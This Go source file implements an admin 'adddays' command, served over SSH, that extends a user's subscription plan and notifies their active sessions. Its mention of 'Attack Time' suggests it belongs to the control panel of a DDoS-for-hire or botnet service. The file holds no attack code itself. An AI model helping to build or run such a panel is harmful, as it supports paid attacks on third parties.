package subcommands

import (
	Sessions "Yami/core/clients/session"
	"Yami/core/db"
	"strconv"
	"strings"

	"golang.org/x/crypto/ssh"
)

func AddDays(cmd []string, conn *ssh.ServerConn, channel ssh.Channel) {

	if len(cmd) != 4 {
		channel.Write([]byte("Correct Syntax: users adddays <Username> <Days>\r\n"))
		return
	}

	error := YamiDB.Exists(cmd[2]); if !error {
		channel.Write([]byte("User doesnt exist in the database\r\n"))
		return
	}

	duration, err := strconv.Atoi(cmd[3])
	if err != nil {
		channel.Write([]byte("Attack Time change request must be an int\r\n"))
		return
	}

	Status := YamiDB.AddDays(cmd[2], duration); if !Status {
		channel.Write([]byte("Failed to add "+cmd[3]+" days to plans!"))
		return
	} else {
		channel.Write([]byte("\x1b[38;5;11m"+cmd[3]+" have been added to that users plan!\r\n"))
	}
	
	for _, s := range Sessions.Sessions {
		if strings.ToLower(cmd[2]) == s.User.Username {
			s.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K\x1b[38;5;11m"+cmd[3]+" Days have been added to your plan!\x1b[0m\x1b[0m\x1b8"))
		}
	}

	return

}